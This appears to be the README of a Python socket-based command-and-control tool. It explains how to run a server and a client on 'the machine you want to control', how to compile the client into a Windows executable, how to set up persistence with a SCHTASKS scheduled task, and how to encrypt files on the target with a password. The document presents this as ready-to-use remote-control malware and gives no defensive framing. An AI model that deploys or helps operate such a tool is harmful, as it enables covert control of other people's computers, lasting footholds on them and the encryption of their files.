# Python-socket-C2
Client-Server Command and Control in python using sockets.


(with python installed)
you can run "python3 server.py" on your machine and "python3 client.py" on the machine you want to control./n
You can send commands and get the responses, encrypt and decrypt files, have an encrypted transmission and create the persistence on the client machine.
Just write the ip address of the server machine on the client code and select a port on both of them (if you want to communicate on public network you need a port forwarding).

(on a windows machine without python istalled)
you can use the "pyinstaller" module to create a .exe file of the programs which are capable of be launched on any machine.
the command is:
pyinstaller client.py --onefile        # to create the client.exe file.


To create persistence you can run a string like this on the server once connected to the client:
SCHTASKS /CREATE /SC DAILY /TN "folder/name_of_the_task" /TR "path/client.exe" /ST HH:MM


To encrypt and decrypt files you have to run these two strings:
#encrypt:
encryptfile file_name=file, pass=tonona
#decrypt
decryptfile file=file, pass=tonona

The first will create a .AES file that can be decrypted using the second command.
